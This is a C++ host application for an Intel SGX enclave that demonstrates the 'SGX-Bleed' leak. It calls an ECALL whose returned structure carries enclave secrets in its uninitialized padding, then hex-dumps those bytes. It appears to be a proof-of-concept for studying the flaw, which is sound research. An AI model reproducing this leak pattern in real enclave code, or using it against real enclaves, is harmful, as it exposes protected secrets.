#include <cstdio>
#include <cstring>
#include <iostream>
#include "Enclave_u.h"
#include <sgx_urts.h>
#include "error_print.hpp"
#include <openssl/bio.h>

sgx_enclave_id_t global_eid = 0;


/* display bytes of the secret buffer for debug */
void ocall_debug_print(uint8_t *buf, size_t sz)
{
	std::cout << "-----------------------------------------------------------------------------" << std::endl;
	std::cout << "secret buffer to be leaked by SGX-Bleed (debug display)" << std::endl;
	std::cout << "-----------------------------------------------------------------------------" << std::endl;
	
	BIO_dump_fp(stdout, (char*)buf, sz);

	std::cout << std::endl;
}


/* Enclave initialization function */
int initialize_enclave()
{
    sgx_launch_token_t token = {0};
	std::string enclave_image_name = "enclave.signed.so";
    int updated = 0;

    sgx_status_t status;

    status = sgx_create_enclave(enclave_image_name.c_str(), SGX_DEBUG_FLAG,
                &token, &updated, &global_eid, NULL);

    if(status != SGX_SUCCESS)
	{
		print_sgx_status(status);
		return -1;
	}

    return 0;
}


int main()
{
	/* initialize enclave */
	if(initialize_enclave() < 0)
	{
		std::cerr << "App: fatal error: Failed to initialize enclave.";
		std::cerr << std::endl;
		return -1;
	}


	/* structure containing padding. Defined in Enclave.hpp, 
	 * and included in Enclave.edl */
	test_struct_t test_st;

	std::cout << "Execute ECALL.\n" << std::endl;

	/* ECALL that would "bleed" (leak) enclave secrets */
	sgx_status_t status = ecall_bleed(global_eid, &test_st);

	if(status != SGX_SUCCESS)
	{
		print_sgx_status(status);

		return -1;
	}
	else
	{
		print_sgx_status(status);
	}

	std::cout << "\nBytes of the test_st structure ->" << std::endl;

	/* display bytes of the entire test_st structure
	 * we can see here that the secrets within Enclave 
	 * has been "bleeded". */
	std::cout << "\n-----------------------------------------------------------------------------" << std::endl;
	std::cout << "returned structure (the secret bytes are \"bleeded\")" << std::endl;
	std::cout << "-----------------------------------------------------------------------------" << std::endl;
	BIO_dump_fp(stdout, (const char*)&test_st, sizeof(test_struct_t));

	/* Destruct the enclave */
	sgx_destroy_enclave(global_eid);

	std::cout << "\nWhole operations have been executed successfully." << std::endl;

	return 0;
}
